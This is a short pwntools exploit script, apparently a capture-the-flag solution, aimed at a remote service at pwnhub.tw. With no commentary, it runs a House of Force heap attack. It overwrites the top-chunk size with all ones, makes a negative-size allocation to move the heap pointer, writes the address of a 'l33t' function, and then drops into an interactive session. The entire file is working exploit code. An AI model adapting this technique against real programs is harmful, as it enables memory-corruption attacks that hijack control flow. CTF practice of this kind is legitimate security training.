#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "pwnhub.tw"
port = 19010

r = remote(host,port)

def allocate(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

allocate(0x50,"a")
allocate(0x30,"a"*0x30 + p64(0) + p64(0xffffffffffffffff))
nb = -0xc0 - 16
allocate(nb,"a")
l33t = 0x400b42
allocate(0x30,p64(l33t) *2 )
r.interactive()
